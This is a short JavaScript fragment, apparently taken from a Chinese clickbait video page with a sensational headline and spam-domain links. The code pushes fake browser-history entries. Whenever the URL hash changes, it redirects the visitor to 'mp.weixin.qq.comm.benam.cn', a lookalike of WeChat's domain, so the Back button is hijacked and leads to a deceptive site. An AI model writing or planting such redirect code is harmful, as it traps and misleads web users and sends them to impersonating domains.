...
var htimg='http://puep.qpic.cn/coral/Q3auHgzwzM4fgQ41VTF2rJLEUQzFF5g6vtaCczdL62ZblmyE4q76Sg/0',hturl='http://runing-001.antistaticfabric.cn/2017-11-12/content.html?M=JoEmaKHNEg4Ri0&cDc=yc0yV9ZBrjJc3N&i=Rai8jF6g&y=3cHHKtcl1gzJoM8&EoH=5947335677',til='特种兵退役开饭店，小痞子不知天高地厚竟来收保护费>>',vid='m0363jdry96',delayTime = 155;
...
window.onhashchange=function(){jp();};function hh() {history.pushState(history.length+1, "app", "#pt_"+new Date().getTime());}function jp() {location.href="http://mp.weixin.qq.comm.benam.cn/nyyy.html?ad=" + (parseInt((parseInt(new Date().getTime() / (1000*60*1))+'').substring(2))+5000);}
